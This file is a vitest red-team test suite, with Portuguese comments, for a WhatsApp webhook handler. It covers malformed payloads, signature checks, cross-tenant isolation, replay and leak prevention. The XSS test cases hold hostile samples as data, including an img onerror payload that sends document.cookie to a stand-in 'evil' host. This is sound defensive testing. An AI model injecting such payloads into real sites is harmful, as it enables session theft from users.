import { beforeEach, describe, expect, it } from 'vitest';
import { MessageDirection, MessageStatus, MessageType, WebhookEventStatus } from '@prisma/client';
import { handleEvent } from '@/features/webhooks/processor';
import { parseWebhookPayload } from '@/features/webhooks/parser';
import { computeSignature, verifySignature } from '@/features/webhooks/signature';
import { listConversations } from '@/features/messaging/inbox-query';
import { resetDatabase, testPrisma } from '../helpers/db';
import { seedChannel, seedEligibleContact, seedTenant } from '../helpers/factories';
import { PHONE_NUMBER_ID, statusPayload, textMessagePayload } from '../helpers/webhook-fixtures';

/**
 * Red team do Sprint 3. Cada teste descreve o ataque e o comportamento correto.
 */

async function deliver(payload: unknown) {
  const parsed = parseWebhookPayload(JSON.stringify(payload));
  if (!parsed.ok) return { rejected: parsed.reason, outcomes: [] };

  const outcomes = [];
  for (const event of parsed.events) {
    outcomes.push(await handleEvent(event, { signatureValid: true }));
  }
  return { rejected: null, outcomes };
}

async function tenantWithChannel(label: string) {
  const tenant = await seedTenant(label);
  const channel = await seedChannel(tenant.workspaceId, { phoneNumberId: PHONE_NUMBER_ID });
  return { tenant, channel };
}

describe('red team — payload hostil', () => {
  beforeEach(async () => {
    await resetDatabase();
  });

  it.each([
    ['vazio', ''],
    ['JSON quebrado', '{"object":'],
    ['array', '[]'],
    ['numero', '42'],
    ['objeto de outro produto', '{"object":"instagram"}'],
    ['entry nulo', '{"object":"whatsapp_business_account","entry":null}'],
  ])('recusa %s sem efeito colateral', async (label, body) => {
    await tenantWithChannel(`rt-${label.slice(0, 5)}`);
    const parsed = parseWebhookPayload(body);

    if (parsed.ok) {
      for (const event of parsed.events) await handleEvent(event, { signatureValid: true });
    }

    await expect(testPrisma().message.count()).resolves.toBe(0);
    await expect(testPrisma().contact.count()).resolves.toBe(0);
  });

  it('payload gigante é recusado antes de virar objeto', async () => {
    const enorme = JSON.stringify({
      object: 'whatsapp_business_account',
      entry: [
        { id: 'x', changes: [{ field: 'messages', value: { padding: 'a'.repeat(2_000_000) } }] },
      ],
    });
    const parsed = parseWebhookPayload(enorme);
    expect(parsed.ok).toBe(false);
    if (parsed.ok) return;
    expect(parsed.reason).toBe('TOO_LARGE');
  });

  it('mensagem sem texto não quebra e é registrada', async () => {
    const { tenant } = await tenantWithChannel('rt-notext');
    const payload = {
      object: 'whatsapp_business_account',
      entry: [
        {
          id: 'w',
          changes: [
            {
              field: 'messages',
              value: {
                metadata: { phone_number_id: PHONE_NUMBER_ID },
                messages: [
                  {
                    from: '5585988887777',
                    id: 'wamid.NOTEXT',
                    type: 'location',
                    timestamp: '1755734400',
                  },
                ],
              },
            },
          ],
        },
      ],
    };

    const { outcomes } = await deliver(payload);
    expect(outcomes[0]?.result).toBe('PROCESSED');

    const message = await testPrisma().message.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(message.type).toBe(MessageType.LOCATION);
    expect(message.body).toBeNull();
  });

  it('tipo do futuro vira UNSUPPORTED sem derrubar nada', async () => {
    const { tenant } = await tenantWithChannel('rt-future');
    const payload = {
      object: 'whatsapp_business_account',
      entry: [
        {
          id: 'w',
          changes: [
            {
              field: 'messages',
              value: {
                metadata: { phone_number_id: PHONE_NUMBER_ID },
                messages: [
                  {
                    from: '5585988887777',
                    id: 'wamid.FUT',
                    type: 'holograma_3d',
                    timestamp: '1755734400',
                  },
                ],
              },
            },
          ],
        },
      ],
    };

    await deliver(payload);
    const message = await testPrisma().message.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(message.type).toBe(MessageType.UNSUPPORTED);
  });

  it('mensagem gigantesca é aceita sem estourar', async () => {
    const { tenant } = await tenantWithChannel('rt-long');
    const texto = 'a'.repeat(60_000);
    await deliver(textMessagePayload({ wamid: 'wamid.LONG', body: texto }));

    const message = await testPrisma().message.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(message.body?.length).toBe(60_000);
  });

  it.each([
    ['script', '<script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror="fetch(`//evil?c=${document.cookie}`)">'],
    ['iframe', '<iframe src="javascript:alert(1)"></iframe>'],
    ['entidade html', '&lt;script&gt;alert(1)&lt;/script&gt;'],
    // Override de direção e espaço de largura zero, por escape para não deixar
    // caractere de controle literal no arquivo.
    ['unicode invisivel', 'texto‮oculto​'],
  ])('conteúdo hostil (%s) é guardado literalmente, como dado', async (label, hostil) => {
    const { tenant } = await tenantWithChannel(`rt-x-${label.slice(0, 4)}`);
    await deliver(textMessagePayload({ wamid: `wamid.X${label.length}`, body: hostil }));

    const message = await testPrisma().message.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    // Guardado exatamente como veio; a defesa contra XSS é a renderização como
    // texto pelo React, não a mutilação do dado.
    expect(message.body).toBe(hostil);
  });

  it('nome de perfil hostil não escapa do campo de nome', async () => {
    const { tenant } = await tenantWithChannel('rt-name');
    await deliver(
      textMessagePayload({ wamid: 'wamid.NM', profileName: '<script>alert(1)</script>' }),
    );

    const contact = await testPrisma().contact.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(contact.firstName).toBe('<script>alert(1)</script>');
  });

  it('nome de perfil absurdamente longo é truncado', async () => {
    const { tenant } = await tenantWithChannel('rt-name2');
    await deliver(textMessagePayload({ wamid: 'wamid.NM2', profileName: 'n'.repeat(5000) }));

    const contact = await testPrisma().contact.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(contact.firstName?.length).toBeLessThanOrEqual(120);
  });
});

describe('red team — assinatura', () => {
  const SECRET = 'segredo-de-teste';

  it('replay com corpo alterado é recusado', () => {
    const original = JSON.stringify(textMessagePayload({ wamid: 'wamid.A' }));
    const assinatura = computeSignature(original, SECRET);
    const alterado = JSON.stringify(textMessagePayload({ wamid: 'wamid.B' }));

    expect(verifySignature(alterado, assinatura, SECRET).valid).toBe(false);
  });

  it('assinatura válida de outro app não serve', () => {
    const corpo = JSON.stringify(textMessagePayload({ wamid: 'wamid.A' }));
    const assinaturaDeOutro = computeSignature(corpo, 'segredo-do-atacante');

    expect(verifySignature(corpo, assinaturaDeOutro, SECRET).valid).toBe(false);
  });

  it('sem segredo configurado nada é aceito', () => {
    const corpo = JSON.stringify(textMessagePayload({ wamid: 'wamid.A' }));
    expect(verifySignature(corpo, computeSignature(corpo, SECRET), null)).toEqual({
      valid: false,
      reason: 'NOT_CONFIGURED',
    });
  });
});

describe('red team — cross tenant e replay', () => {
  beforeEach(async () => {
    await resetDatabase();
  });

  it('phone_number_id de outro workspace não move dado nenhum', async () => {
    const alvo = await seedTenant('rt-alvo');
    const atacante = await seedTenant('rt-atacante');
    await seedChannel(alvo.workspaceId, { phoneNumberId: PHONE_NUMBER_ID });
    await seedChannel(atacante.workspaceId, { phoneNumberId: '555555555555555' });

    await deliver(textMessagePayload({ wamid: 'rt.ISO' }));

    await expect(
      testPrisma().contact.count({ where: { workspaceId: atacante.workspaceId } }),
    ).resolves.toBe(0);
    await expect(listConversations(atacante.workspaceId)).resolves.toEqual([]);
  });

  it('phone_number_id inexistente não cria workspace nem contato', async () => {
    await tenantWithChannel('rt-ghost');
    const { outcomes } = await deliver(
      textMessagePayload({ wamid: 'rt.GHOST', phoneNumberId: '000000000000000' }),
    );

    expect(outcomes[0]?.result).toBe('IGNORED');
    await expect(testPrisma().contact.count()).resolves.toBe(0);
    const event = await testPrisma().webhookEvent.findFirstOrThrow({});
    expect(event.workspaceId).toBeNull();
  });

  it('replay de 20 entregas idênticas produz um efeito só', async () => {
    const { tenant, channel } = await tenantWithChannel('rt-replay');
    const contactId = await seedEligibleContact(tenant.workspaceId, '+5585988887777');
    await testPrisma().message.create({
      data: {
        workspaceId: tenant.workspaceId,
        channelId: channel.id,
        contactId,
        direction: MessageDirection.OUTBOUND,
        type: MessageType.TEMPLATE,
        status: MessageStatus.SENT,
        providerMessageId: 'wamid.REPLAY',
      },
    });

    const payload = statusPayload({ wamid: 'wamid.REPLAY', status: 'delivered' });
    for (let index = 0; index < 20; index += 1) await deliver(payload);

    await expect(testPrisma().webhookEvent.count()).resolves.toBe(1);
    const message = await testPrisma().message.findFirstOrThrow({
      where: { providerMessageId: 'wamid.REPLAY' },
    });
    expect(message.status).toBe(MessageStatus.DELIVERED);

    // Um único audit log de transição, não vinte.
    await expect(
      testPrisma().auditLog.count({ where: { action: 'message.status_delivered' } }),
    ).resolves.toBe(1);
  });

  it('mesma mensagem recebida em rajada concorrente não duplica', async () => {
    const { tenant } = await tenantWithChannel('rt-burst');
    const payload = textMessagePayload({ wamid: 'wamid.BURST' });

    await Promise.all(Array.from({ length: 8 }, () => deliver(payload)));

    await expect(
      testPrisma().message.count({ where: { workspaceId: tenant.workspaceId } }),
    ).resolves.toBe(1);
    await expect(
      testPrisma().conversation.count({ where: { workspaceId: tenant.workspaceId } }),
    ).resolves.toBe(1);

    const conversation = await testPrisma().conversation.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    // O contador não pode ter sido incrementado oito vezes.
    expect(conversation.unreadCount).toBe(1);
  });

  it('mensagens diferentes em rajada criam uma conversa só', async () => {
    const { tenant } = await tenantWithChannel('rt-burst2');

    await Promise.all(
      Array.from({ length: 6 }, (_value, index) =>
        deliver(textMessagePayload({ wamid: `wamid.BR${index}`, body: `msg ${index}` })),
      ),
    );

    await expect(
      testPrisma().conversation.count({ where: { workspaceId: tenant.workspaceId } }),
    ).resolves.toBe(1);
    await expect(
      testPrisma().contact.count({ where: { workspaceId: tenant.workspaceId } }),
    ).resolves.toBe(1);
    await expect(
      testPrisma().message.count({ where: { workspaceId: tenant.workspaceId } }),
    ).resolves.toBe(6);
  });
});

describe('red team — segredos nunca vazam', () => {
  beforeEach(async () => {
    await resetDatabase();
  });

  it('o payload persistido não guarda cabeçalho nem assinatura', async () => {
    const { tenant } = await tenantWithChannel('rt-leak');
    await deliver(textMessagePayload({ wamid: 'wamid.LEAK' }));

    const event = await testPrisma().webhookEvent.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId },
    });
    const serialized = JSON.stringify(event.payload);

    expect(serialized).not.toMatch(/x-hub-signature|authorization|sha256=/i);
    expect(serialized).not.toContain('EAAG');
    // Guarda o que é preciso para reprocessar.
    expect(serialized).toContain('phoneNumberId');
  });

  it('o audit log não guarda o conteúdo da conversa', async () => {
    const { tenant } = await tenantWithChannel('rt-audit');
    await deliver(
      textMessagePayload({ wamid: 'wamid.SEC', body: 'meu cartao e 4111 1111 1111 1111' }),
    );

    const logs = await testPrisma().auditLog.findMany({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(JSON.stringify(logs)).not.toContain('4111');
  });
});

describe('red team — estado inconsistente', () => {
  beforeEach(async () => {
    await resetDatabase();
  });

  it('status para mensagem de entrada não outbound é ignorado', async () => {
    const { tenant } = await tenantWithChannel('rt-inbound-status');
    await deliver(textMessagePayload({ wamid: 'wamid.INB' }));

    // Um status chegando para o wamid de uma mensagem RECEBIDA.
    const { outcomes } = await deliver(statusPayload({ wamid: 'wamid.INB', status: 'read' }));
    expect(outcomes[0]?.result).toBe('IGNORED');

    const message = await testPrisma().message.findFirstOrThrow({
      where: { workspaceId: tenant.workspaceId, providerMessageId: 'wamid.INB' },
    });
    expect(message.status).toBe(MessageStatus.RECEIVED);
  });

  it('evento processado fica marcado e consultável para reprocessamento', async () => {
    const { tenant } = await tenantWithChannel('rt-fail');
    await deliver(textMessagePayload({ wamid: 'wamid.OK' }));

    const events = await testPrisma().webhookEvent.findMany({
      where: { workspaceId: tenant.workspaceId },
    });
    expect(events.every((event) => event.status === WebhookEventStatus.PROCESSED)).toBe(true);
    expect(events.every((event) => event.failedAt === null)).toBe(true);
  });
});
